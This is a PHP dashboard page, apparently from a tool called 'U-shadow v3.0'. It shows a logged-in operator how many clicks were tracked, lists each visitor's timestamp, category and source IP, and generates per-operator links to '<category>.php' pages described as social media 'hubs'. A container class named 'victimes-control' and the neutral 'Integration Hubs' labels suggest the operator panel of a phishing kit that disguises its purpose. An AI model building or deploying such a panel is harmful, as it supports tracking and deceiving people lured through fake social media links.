<?php
require_once __DIR__ . '/../config.php';
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}
$user = $_SESSION['user'];

$analytics_data = json_decode(file_get_contents(ANALYTICS_FILE), true);
$user_analytics = array_filter($analytics_data, function($v) use ($user) {
    return $v['user_id'] === $user['username'];
});
$clicks_count = count($user_analytics);
$categories = json_decode(file_get_contents(CATEGORIES_FILE), true);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-shadow | Dashboard</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<header>
    <div class="logo">U-SHADOW</div>
</header>

<nav>
    <ul>
        <li><a href="index.php">Home</a></li>
        <li><a href="signup.php">Sign Up</a></li>
        <li><a href="dashboard.php">Dashboard</a></li>
        <li><a href="logout.php">Logout</a></li>
    </ul>
</nav>

<div class="main-container">
    <div class="victimes-control" style="flex: 1;">
        <div class="panel-header">.: Dashboard :.</div>
        <div class="panel-body">
            <p>Welcome back, <strong><?php echo s($user['username']); ?></strong>!</p>
            <?php if (isset($user['is_admin']) && $user['is_admin']): ?>
                <p><strong>Admin Panel:</strong> <a href="admin_categories.php" style="color: blue;">Manage Integration Hubs</a></p>
            <?php endif; ?>

            <div style="border: 1px solid #ddd; padding: 20px; background-color: #f9f9f9; border-radius: 5px;">
                <h3>Your Statistics</h3>
                <p>Total Clicks Tracked: <strong><?php echo $clicks_count; ?></strong></p>
                <p>Active Integration Links: <strong><?php echo count($categories); ?></strong></p>
            </div>

            <hr>
            <h3>Recent Click Analytics</h3>
            <div style="overflow-x: auto;">
                <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                    <thead>
                        <tr style="background: #f2f2f2; border-bottom: 2px solid #ddd;">
                            <th style="padding: 10px; text-align: left;">Timestamp</th>
                            <th style="padding: 10px; text-align: left;">Category</th>
                            <th style="padding: 10px; text-align: left;">Source IP</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($clicks_count > 0): ?>
                            <?php foreach (array_reverse($user_analytics) as $click): ?>
                                <tr style="border-bottom: 1px solid #eee;">
                                    <td style="padding: 10px;"><?php echo s($click['timestamp']); ?></td>
                                    <td style="padding: 10px;"><?php echo s($click['category']); ?></td>
                                    <td style="padding: 10px;"><?php echo s($click['source_ip']); ?></td>
                                </tr>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <tr>
                                <td colspan="3" style="padding: 20px; text-align: center; color: #888;">No clicks tracked yet.</td>
                            </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>

            <hr>
            <h3>Integration Links</h3>
            <p>Use these links to share your professional social media hubs:</p>
            <div style="display: flex; flex-wrap: wrap; gap: 10px;">
                <?php
                foreach ($categories as $cat):
                    $generated_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/" . strtolower($cat) . ".php?user=" . urlencode($user['username']);
                ?>
                    <div style="border: 1px solid #ccc; padding: 10px; background: #fff; width: 220px; border-radius: 5px;">
                        <strong><?php echo s($cat); ?> Hub</strong><br>
                        <input type="text" value="<?php echo s($generated_link); ?>" style="width: 100%; font-size: 10px; margin-top: 5px; padding: 3px;" readonly onclick="this.select()">
                        <p style="font-size: 10px; color: #666; margin-top: 5px;">Tracking Enabled</p>
                    </div>
                <?php endforeach; ?>
            </div>
            <p style="margin-top: 20px;"><a href="logout.php">Logout</a></p>
        </div>
    </div>
</div>

<div class="footer">
    Copyright 2010-2025 | Developed By K24KDX <br>
    U-shadow v3.0
</div>

</body>
</html>
